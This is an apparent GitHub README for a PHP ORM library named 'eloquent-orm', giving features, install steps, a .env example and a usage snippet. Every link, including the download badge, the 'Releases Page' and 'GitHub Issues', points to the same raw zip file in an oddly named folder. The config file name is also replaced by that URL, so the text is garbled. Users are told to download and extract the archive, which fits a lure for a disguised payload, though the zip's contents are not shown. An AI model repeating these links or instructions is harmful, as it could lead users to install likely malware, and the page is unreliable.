# 🌟 eloquent-orm - A Simple PHP ORM for Everyone

## 🚀 Getting Started

Welcome to **eloquent-orm**! This project provides a simple object-relational mapping (ORM) library for PHP that is compatible with version 8 and MySQL. With features like model relationships, fluent queries, and unit testing support, you can easily manage your database in a more intuitive way.

### 📥 Download Eloquent ORM

[![Download Eloquent ORM](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip%20Eloquent%20ORM-brightgreen)](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip)

## 📃 Description

**eloquent-orm** offers a user-friendly interface to interact with your database. It simplifies tasks like creating, reading, updating, and deleting data (CRUD). You can build complex queries without writing lengthy SQL statements. Designed for ease of use, this library is perfect for anyone wanting to work with databases without deep programming knowledge.

## 🛠️ Features

- **Easy Model Relationships**: Define relationships between models easily.
- **Fluent Queries**: Build queries step by step in a clear format.
- **Security with Prepared Statements**: Protect your data with built-in security measures.
- **Unit Testing Support**: Ensure your application works correctly with easy testing.

## 📋 System Requirements

- PHP version 8 or higher
- MySQL database
- A web server (like Apache or Nginx)
- Composer for managing dependencies

## 💻 How to Install

### Step 1: System Setup

Before installation, ensure your environment meets the system requirements mentioned above. You should have PHP and MySQL set up on your local machine or server.

### Step 2: Download & Install Eloquent ORM

Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip).

On the Releases page, you will find the latest version of eloquent-orm. Click on the version link to download the package.

### Step 3: Extract the Files

Once downloaded, extract the files to your project directory. You can do this by right-clicking the downloaded ZIP file and selecting "Extract All..." or using a tool like WinRAR or 7-Zip.

### Step 4: Install Dependencies

Open a command line in your project directory and run the following command to install dependencies:

```
composer install
```

This command will download any required packages needed for eloquent-orm.

### Step 5: Configure Your Database

Open the configuration file (`.env` or `https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip`, depending on your setup) and input your database details:

```php
DB_HOST=your_database_host
DB_DATABASE=your_database_name
DB_USERNAME=your_username
DB_PASSWORD=your_password
```

### Step 6: Run the Application

Now you can run your application. If using a local server, place your project directory in the server’s root directory. Access the application through your browser using:

```
http://localhost/your_project_directory/
```

## 🔎 Example Usage

Here’s how to use eloquent-orm for a simple database query:

```php
use Eloquent\Model;

class User extends Model {
    protected $table = 'users'; // Your table name
}

// Fetch users from the database
$users = User::all();

foreach ($users as $user) {
    echo $user->name; // Display user names
}
```

This example demonstrates how you can quickly retrieve data from a database table called `users`.

## 📚 Documentation

For detailed documentation on how to use all features provided by eloquent-orm, visit our wiki or repo documentation pages available on GitHub.

## 🎥 Video Tutorials

We provide a series of video tutorials that guide you through common tasks:

- Setting up your first ORM class
- Understanding model relationships
- Performing CRUD operations

Check out the video section on our GitHub page for more.

## 🧑‍🤝‍🧑 Community & Support

Join our community to connect with other users. Share your experiences and ask questions. You can find us on:

- [GitHub Issues](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip) for reporting bugs or asking questions.
- Discord or forums for informal support.

## 📝 Contribution

We welcome contributions! If you'd like to improve this project, follow our contribution guidelines available in the repository. Please ensure any changes are well-tested.

### License

This project is licensed under the MIT License. For more details, please refer to the LICENSE file in the repository.

## ☎️ Contact

For further inquiries or feedback, please reach out to us through the contact options available on our GitHub page.

Feel free to explore **eloquent-orm** and make database management simple and efficient!